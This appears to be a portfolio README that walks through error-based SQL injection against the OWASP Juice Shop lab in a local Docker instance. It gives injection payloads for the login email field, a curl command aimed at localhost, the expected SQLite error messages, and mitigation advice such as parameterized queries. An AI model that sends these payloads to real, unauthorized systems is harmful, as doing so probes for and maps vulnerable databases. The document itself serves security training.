
📁 `Error-Handling-Attacks-Juice-Shop/2-SQL-Injection-Error-based/Read-Me.md`

This version is structured for demonstrating **expertise in offensive security**, **manual web exploitation**, and **technical breakdown of DBMS errors**.

---

````markdown
# 🔥 2 – SQL Injection (Error-Based)

> 📂 Path: `Error-Handling-Attacks-Juice-Shop/2-SQL-Injection-Error-based/`

---

## ⚔️ Description

Error-based SQL Injection occurs when crafted payloads are injected into SQL queries and the resulting **database error messages are returned to the client**, revealing internal logic, table structures, column names, or even backend DBMS versions.

This type of SQLi is often the **first step of a full compromise**, allowing attackers to:
- Confirm injection points
- Perform DB schema enumeration
- Chain into stacked queries
- Exploit improper sanitization or unsafe SQL construction logic

---

## 🧠 Deep Technical PoC

### 🎯 Objective

Manually identify an input vector vulnerable to error-based SQL injection using tools like Burp Suite, curl, and browser DevTools, and then use crafted payloads to extract internal DB errors via verbose feedback.

---

### 🛠️ Tools Used

| Tool          | Purpose                                         |
|---------------|-------------------------------------------------|
| 🔍 **Burp Suite** | Intercept requests, inject SQLi payloads         |
| 🧪 **curl**        | Send precise HTTP payloads to REST endpoints     |
| 🧰 **DevTools**    | Monitor frontend error responses & browser logs |
| 🧠 **SQLMap (Optional)** | Validate manually identified injection points |

---

### 🧪 Step-by-Step Attack Procedure

#### 1️⃣ Start Juice Shop

Launch vulnerable lab environment using Docker:

```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop
````

Application available at:

```
http://localhost:3000
```

---

#### 2️⃣ Identify Injection Surface

Use browser UI to find any input forms where unsanitized input may be handled by backend SQL queries. Common targets:

* 🔐 **Login Form**
* 🔍 **Search Bar**
* 📝 **Feedback Submission**
* 📦 **Product Reviews or Comments**

Example: Login page → Enter dummy credentials.

---

#### 3️⃣ Intercept Request with Burp

Capture the `POST /rest/user/login` request using Burp:

```json
{
  "email": "admin@juice-sh.op",
  "password": "dummy"
}
```

Now inject error-based payload into the `email` field.

---

#### 4️⃣ Inject Faulty SQL Payloads

##### 🩸 Payload 1 – Quotation-based Injection

```json
"email": "'",
"password": "password"
```

Expected Output:

```json
{
  "error": "SQLITE_ERROR: unrecognized token: \"'\""
}
```

##### 🩸 Payload 2 – Arithmetic Error

```json
"email": "'||(1/0)||'",
"password": "password"
```

Expected:

```
Division by zero error from backend
```

##### 🩸 Payload 3 – String Concatenation to Force Error

```json
"email": "'||(SELECT table_name FROM information_schema.tables)||'",
"password": "password"
```

May produce:

```
SQLITE_ERROR: no such column: table_name
```

✅ This confirms:

* SQL engine is actively evaluating injected logic.
* Injection is occurring server-side, not filtered on frontend.

---

#### 5️⃣ Alternate Method – curl-Based Testing

```bash
curl -X POST http://localhost:3000/rest/user/login \
-H "Content-Type: application/json" \
-d '{"email":"\'", "password":"test"}'
```

Expected output:

```json
{
  "error": "SQLITE_ERROR: unrecognized token: \"'\""
}
```

---

#### 6️⃣ Analyze Server Response

Indicators of error-based SQLi:

* `SQLITE_ERROR`
* `unrecognized token`
* `no such table/column`
* Backend crash or stack trace leak

---

## 🚩 Hacker Insight

### 🧩 What’s Exposed?

| Leaked Info              | Exploit Value                                     |
| ------------------------ | ------------------------------------------------- |
| DBMS Engine (SQLite)     | Allows version-specific payload crafting          |
| Error Tokens (`'`, `--`) | Confirms input not sanitized or escaped           |
| Stack Trace (optional)   | Reveals vulnerable backend file/methods           |
| Query Failure Reason     | Can guide further union/select-based SQLi attacks |

---

### 🔍 Reconnaissance Advantage

* ✅ Pinpoints exact SQL injection vectors
* 🔁 Enables automation with tools like SQLMap
* 🔐 Reveals schema design (tables, columns) via indirect inference
* 📤 Helps escalate to time-based or union-based SQLi

---

### 🧨 Real-World CVEs

* **[CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917)** – Joomla SQLi via error-based vector
* **[CVE-2019-12949](https://nvd.nist.gov/vuln/detail/CVE-2019-12949)** – WordPress plugin leaking DB errors
* **[CVE-2022-39966](https://nvd.nist.gov/vuln/detail/CVE-2022-39966)** – Zoho ManageEngine SQLi from error leaks

---

## 💣 Exploit Demo Video

*Add video or GIF showing Burp request with SQL payloads and visible DB error in response.*

---

## 🛡️ Mitigation Recommendations

| Remediation                     | Reason                                        |
| ------------------------------- | --------------------------------------------- |
| ❌ Do not return raw SQL errors  | Prevents leakage of DB schema and query logic |
| ✅ Use parameterized queries     | Eliminates injection risk                     |
| 🧰 Implement input validation   | Reject or sanitize harmful characters         |
| 🔒 Disable stack traces in prod | Avoid leaking file paths or sensitive logic   |

Sample Node.js fix:

```js
db.query("SELECT * FROM users WHERE email = ?", [email])
```

---

## 🧭 Classification in Offensive Security

| Discipline         | Relevance                          |
| ------------------ | ---------------------------------- |
| Web App Pentesting | SQLi vector enumeration            |
| Red Teaming        | Recon and lateral movement         |
| Exploit Research   | DB error parsing and query control |
| Vulnerability Dev  | Input validation bypass discovery  |

---

## 📂 Suggested Repo Artifacts

* `payloads.sql` – List of tested SQL payloads
* `burp_logs.txt` – Captured raw requests/responses
* `curl_output.log` – CLI-based attack feedback
* `screenshots/` – UI injections and visible DB errors
* `notes/stack-trace-analysis.md` – Analysis of error structure

---

## 🧠 Author

**👨‍💻 Shajohn16**
Offensive Security Practitioner | SQLi Hunter | AppSec Analyst
*GitHub: [@Shajohn16](https://github.com/Shajohn16)*

---
```
```
